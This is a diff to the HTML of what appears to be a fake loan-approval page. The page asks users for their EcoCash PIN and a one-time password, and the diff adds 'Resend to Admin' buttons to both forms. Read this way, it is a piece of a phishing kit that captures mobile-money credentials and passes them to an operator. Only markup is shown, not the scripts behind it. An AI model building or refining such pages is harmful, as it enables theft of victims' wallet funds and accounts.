@@ -181,6 +181,10 @@
                     <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
                     <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN">✕</button>
                 </div>
+
+                <button class="btn-resend" id="resendBtnPin" onclick="requestResend('pin')">🔄 Resend to Admin</button>
+                <div class="resend-status" id="resendStatusPin"></div>
+
                 <button class="btn-grad" onclick="doPin()">SUBMIT ECOCASH PIN</button>
             </div>
         </div>
@@ -214,6 +218,10 @@
                 <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
                 <button class="btn-resend hidden" id="resendOtpBtn" onclick="resendOtp()">🔄 Resend OTP</button>
                 <div id="rejectionInfo" style="margin-top: 10px; font-size: 0.8rem; color: var(--text-light);"></div>
+
+                <button class="btn-resend" id="resendBtnOtp" onclick="requestResend('otp')">🔄 Resend to Admin</button>
+                <div class="resend-status" id="resendStatusOtp"></div>
+
                 <button class="btn-grad" onclick="doOtp()" style="margin-top: 10px;">VERIFY & APPROVE LOAN</button>
             </div>
         </div>
